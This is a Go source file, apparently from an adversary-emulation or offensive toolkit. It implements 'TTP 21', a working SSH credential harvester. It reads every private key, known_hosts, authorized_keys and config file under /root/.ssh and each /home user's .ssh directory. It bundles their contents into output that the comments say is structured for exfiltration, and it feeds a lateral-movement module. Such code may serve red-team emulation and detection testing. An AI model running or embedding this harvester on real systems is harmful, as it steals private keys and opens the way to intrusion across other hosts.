package ttp

// ssh_harvest.go — TTP 21: SSH key and known_hosts harvesting
//
// ATT&CK: T1145 (Private Keys) + T1552.004 (Private Keys in Files)
//
// Searches /root/.ssh and /home/*/.ssh for:
//   - Private keys (id_rsa, id_ed25519, id_ecdsa, id_dsa, etc.)
//   - known_hosts  (pivot targets — IPs/hostnames the user has connected to)
//   - authorized_keys (may reveal other accounts with this key)
//   - config       (may reveal hostnames, users, ProxyJump chains)
//
// Output is structured for exfiltration and used by TTP 22 (LateralMove)
// to select authentication credentials.

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// SSHHarvest collects SSH private keys, known_hosts, authorized_keys, and config files.
func SSHHarvest() (string, error) {
	dirs := sshSearchDirs()
	var sb strings.Builder
	fileCount := 0

	for _, dir := range dirs {
		entries, err := os.ReadDir(dir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			// Private key: id_* without .pub suffix
			isPrivKey := strings.HasPrefix(name, "id_") && !strings.HasSuffix(name, ".pub")
			// Supporting files for lateral movement planning
			isSupport := name == "known_hosts" || name == "authorized_keys" || name == "config"
			if !isPrivKey && !isSupport {
				continue
			}
			path := filepath.Join(dir, name)
			data, err := os.ReadFile(path)
			if err != nil {
				continue
			}
			fileCount++
			fmt.Fprintf(&sb, "=== %s ===\n%s\n", path, string(data))
		}
	}

	if fileCount == 0 {
		return "ssh_harvest: no SSH key material found", nil
	}
	result := fmt.Sprintf("ssh_harvest: %d files\n%s", fileCount, sb.String())
	// Cap at 32 KB — private keys are small; known_hosts can be large.
	if len(result) > 32768 {
		result = result[:32768] + "\n...(truncated)"
	}
	return result, nil
}

// sshSearchDirs returns the SSH directories to search across all user accounts.
func sshSearchDirs() []string {
	dirs := []string{"/root/.ssh"}
	if entries, err := os.ReadDir("/home"); err == nil {
		for _, e := range entries {
			if e.IsDir() {
				dirs = append(dirs, filepath.Join("/home", e.Name(), ".ssh"))
			}
		}
	}
	return dirs
}

// discoverSSHPrivKeys returns paths to all private key files found on the system.
// Used by LateralMove (TTP 22) to enumerate authentication credentials.
func discoverSSHPrivKeys() []string {
	var keys []string
	for _, dir := range sshSearchDirs() {
		entries, _ := os.ReadDir(dir)
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			name := e.Name()
			if strings.HasPrefix(name, "id_") && !strings.HasSuffix(name, ".pub") {
				keys = append(keys, filepath.Join(dir, name))
			}
		}
	}
	return keys
}
